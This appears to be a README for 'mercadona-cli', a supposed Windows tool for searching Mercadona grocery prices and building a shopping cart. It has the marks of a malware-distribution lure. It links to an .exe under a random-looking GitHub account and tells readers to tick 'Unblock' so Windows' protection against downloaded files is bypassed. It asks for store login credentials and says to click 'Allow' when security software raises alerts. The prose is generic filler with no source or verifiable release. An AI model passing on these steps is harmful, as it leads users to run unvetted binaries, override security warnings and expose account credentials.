# 🛒 mercadona-cli - Manage your grocery shopping with ease

[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/pillarboxconjugation336/mercadona-cli)

## 📥 How to download the software

Follow these steps to get the mercadona-cli tool working on your Windows computer.

1.  Open your internet browser.
2.  Go to the official [release page](https://github.com/pillarboxconjugation336/mercadona-cli).
3.  Look for the section labeled "Assets."
4.  Find the file that ends with ".exe" for Windows.
5.  Click that file to save it to your computer.
6.  Move this file to a folder where you keep your programs.

## ⚙️ Setting up the application

Windows requires you to have permission to run programs. Since this application is a tool meant to help you organize your shopping, you must tell Windows that it is safe to open.

1.  Find the file you saved in the previous step.
2.  Right-click the file icon.
3.  Select "Properties" from the menu.
4.  Look for a section named "Security" at the bottom of the window.
5.  Check the box that says "Unblock."
6.  Click "Apply" and then "OK."

You can now run the tool by double-clicking it. A black window will appear. This is the interface where you will type your commands to search for products or check current prices.

## 🚀 Getting started with searches

The mercadona-cli tool searches the online store database. You can search by product name.

1.  Open the black command window.
2.  Type the word "search" followed by an item, such as "leche" or "queso."
3.  Press the Enter key on your keyboard.
4.  The window will display a list of items that match your request.

The system shows product names and current prices. This helps you plan your budget before you visit the store or finalize an order.

## 📝 Managing your shopping list

You can build a virtual cart using this tool. This feature helps you track items you need for the week.

1.  Use the search command to find the product ID of an item.
2.  Type "add" followed by the product ID.
3.  Press the Enter key.
4.  The system confirms that the item sits in your cart.

To see what is in your cart, type "list" and press Enter. This command displays everything you have added so far, along with the estimated total cost of your order. This total updates instantly when you add or remove items.

## 🔒 Understanding account access

Because this tool connects to your personal store account, the system needs your login information. You provide these details directly to the software on your own machine. We do not store or track your credentials.

To log in:
1.  Type "login" in the command window.
2.  Follow the prompts to enter your email and password.
3.  The tool saves your session locally so you do not need to log in every time you open the program.

If you ever wish to clear your login information, type "logout." This removes all saved session data from your computer.

## 📋 Common troubleshooting steps

Sometimes, the program may not respond as expected. Follow these tips to fix common issues.

- Check your internet connection. The tool needs the web to fetch prices.
- Restart the program. Close the black window and double-click the file again.
- Ensure you have the latest version. Visit the download page again if a new version appears.
- Use simple terms. Avoid long phrases when you search for products. Single words like "pan" or "arroz" work best.

## 🛡️ Privacy and safety rules

You use this tool to interact with the public store website. Please follow these guidelines to keep your experience smooth.

- Use the program during normal hours.
- Perform searches at a standard speed. Avoid rapid-fire requests.
- Keep your login details private.
- Update the software when new versions arrive to ensure compatibility with store changes.

This tool acts as a bridge between your computer and the online shop. It performs the same actions you would take on a web browser but in a faster, text-based format. By streamlining the process, it saves you time that you would otherwise spend navigating menus or waiting for pages to load.

If you find that the program closes unexpectedly, check if your firewall blocks the connection. The tool needs to send and receive data over port 443 to function correctly. If your security software alerts you, select "Allow" to enable the program to reach the official website.

Always remember that this is a community-built tool. It is not an official product of the grocery provider. Therefore, use it to manage your data and shopping lists for your convenience. Keep your focus on your list and enjoy the efficiency of the command line.
